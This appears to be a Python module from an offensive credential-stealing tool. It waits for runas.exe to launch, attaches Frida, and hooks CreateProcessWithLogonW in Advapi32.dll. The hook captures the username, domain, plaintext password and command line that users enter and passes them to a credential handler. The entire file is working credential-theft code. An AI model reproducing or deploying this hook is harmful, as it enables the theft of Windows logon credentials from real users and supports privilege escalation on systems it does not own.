from PyHook import wait_for_process, on_credential_submit
import frida


def wait_for():
    wait_for_process(["runas.exe"], "RunAs", hook)


def hook(pid):
    try:
        print("[ runas-hook ] Trying To Attach To RunAs")
        session = frida.attach(pid)
        print(f"[ runas-hook ] Attached RunAs with pid {pid}!")
        script = session.create_script("""

		var CreateProcessWithLogonW = Module.findExportByName("Advapi32.dll", 'CreateProcessWithLogonW')

		Interceptor.attach(CreateProcessWithLogonW, {
			onEnter: function (args) {


				this.lpUsername = args[0];
				this.lpDomain = args[1];
				this.lpPassword = args[2];
				this.lpCommandLine = args[5];
			},
			onLeave: function (args) {
				send("\\n=============================" + "\\n[+] Intercepted Creds from RunAs" +"\\nUsername    : " + this.lpUsername.readUtf16String() + "\\nCommandline : " + this.lpCommandLine.readUtf16String() + "\\nDomain      : " + this.lpDomain.readUtf16String() + "\\nPassword    : " + this.lpPassword.readUtf16String()+ "\\n=============================");


			}
		});

		""")
        script.on('message', on_credential_submit)
        script.load()

    except Exception as e:
        print("[ runas-hook ] Unhandled exception: " + str(e))
        print("[ runas-hook ] Continuing...")

